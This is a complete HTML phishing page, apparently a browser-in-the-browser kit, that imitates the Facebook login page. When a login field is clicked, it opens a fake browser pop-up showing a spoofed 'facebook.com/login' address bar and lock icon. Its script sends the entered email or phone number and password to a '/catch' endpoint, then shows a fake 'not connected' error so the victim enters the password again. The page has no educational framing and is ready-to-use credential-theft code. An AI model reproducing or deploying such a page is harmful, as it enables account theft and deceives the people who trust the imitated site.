<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>Facebook – log in or sign up</title>
<style>*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:28px;}
.brand{text-align:center}.brand h1{color:#1877f2;font-size:3.5em;font-weight:800;letter-spacing:-1px}
.brand p{color:#1c1e21;font-size:1.1em;max-width:380px;line-height:1.4}
.card{background:white;padding:20px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.15);width:380px}
.card input{width:100%;padding:14px 16px;border:1px solid #ccd0d5;border-radius:6px;font-size:17px;margin-bottom:12px;outline:none}
.card input:focus{border-color:#1877f2;box-shadow:0 0 0 2px rgba(24,119,242,.2)}
.card .login-btn{width:100%;padding:14px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer;margin-bottom:16px}
.card .login-btn:hover{background:#166fe5}
.card .forgot{text-align:center;color:#1877f2;font-size:14px;cursor:pointer;text-decoration:none;display:block;margin-bottom:16px}
.card hr{border:none;border-top:1px solid #dadde1;margin-bottom:16px}
.card .new-btn{display:block;width:fit-content;margin:0 auto;padding:14px 24px;background:#42b72a;color:white;border:none;border-radius:6px;font-size:17px;font-weight:700;cursor:pointer}
#ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:9999;align-items:center;justify-content:center}
#ov.show{display:flex}
.bw{width:440px;border-radius:10px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.5);animation:popIn .15s ease-out}
@keyframes popIn{from{transform:scale(.92);opacity:0}to{transform:scale(1);opacity:1}}
.tb{background:#dee1e6;padding:8px 10px 6px;display:flex;align-items:center;gap:8px}
.dots{display:flex;gap:6px}.dots span{width:13px;height:13px;border-radius:50%;display:block}
.dr{background:#ff5f57}.dy{background:#ffbd2e}.dg{background:#28c840}
.ub{flex:1;background:white;border-radius:20px;padding:3px 12px;display:flex;align-items:center;gap:6px;font-size:13px;color:#333}
.lock{color:#1a73e8;font-size:12px}.xbtn{background:none;border:none;font-size:18px;cursor:pointer;color:#666}
.bd{background:white;padding:28px 32px 24px}
.bd .logo{color:#1877f2;font-size:2em;font-weight:800;text-align:center;margin-bottom:4px}
.bd .sub{text-align:center;font-size:13px;color:#606770;margin-bottom:20px}
.bd input{width:100%;padding:12px 14px;border:1px solid #ccd0d5;border-radius:6px;font-size:16px;margin-bottom:12px;outline:none;box-sizing:border-box}
.bd input:focus{border-color:#1877f2}
.bd .bs{width:100%;padding:12px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:18px;font-weight:700;cursor:pointer}
.bd .err{display:none;color:#d93025;font-size:13px;margin-top:-6px;margin-bottom:10px}
</style></head><body>
<div class="brand"><h1>facebook</h1><p>Connect with friends and the world around you on Facebook.</p></div>
<div class="card">
<input type="text" placeholder="Email address or phone number" onfocus="showB()">
<input type="password" placeholder="Password" onfocus="showB()">
<button class="login-btn" onclick="showB()">Log In</button>
<a class="forgot" href="#">Forgotten password?</a>
<hr>
<button class="new-btn">Create new account</button>
</div>
<div id="ov"><div class="bw">
<div class="tb">
<div class="dots"><span class="dr" onclick="hideB()"></span><span class="dy"></span><span class="dg"></span></div>
<div class="ub"><span class="lock">&#128274;</span><span><strong>facebook.com</strong><span style="color:#888">/login</span></span></div>
<button class="xbtn" onclick="hideB()">&#x2715;</button></div>
<div class="bd">
<div class="logo">facebook</div>
<p class="sub">Log in to your account</p>
<form id="lf" onsubmit="doSub(event)">
<input type="text" id="fu" placeholder="Email or phone number" required>
<input type="password" id="fp" placeholder="Password" required>
<p class="err" id="em">The email or mobile number you entered isn't connected to an account.</p>
<button class="bs" type="submit">Log In</button>
</form></div></div></div>
<script>
function showB(){document.getElementById('ov').classList.add('show');setTimeout(()=>document.getElementById('fu').focus(),150);}
function hideB(){document.getElementById('ov').classList.remove('show');}
document.getElementById('ov').addEventListener('click',function(e){if(e.target===this)hideB();});
function doSub(e){e.preventDefault();
var u=document.getElementById('fu').value,p=document.getElementById('fp').value;
fetch('/catch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user:u,pass:p,ts:new Date().toISOString(),src:'bitb'})}).catch(()=>{});
var b=e.target.querySelector('.bs');b.textContent='Logging in…';b.disabled=true;
setTimeout(()=>{document.getElementById('em').style.display='block';b.textContent='Log In';b.disabled=false;document.getElementById('fp').value='';document.getElementById('fp').focus();},1800);}
</script></body></html>
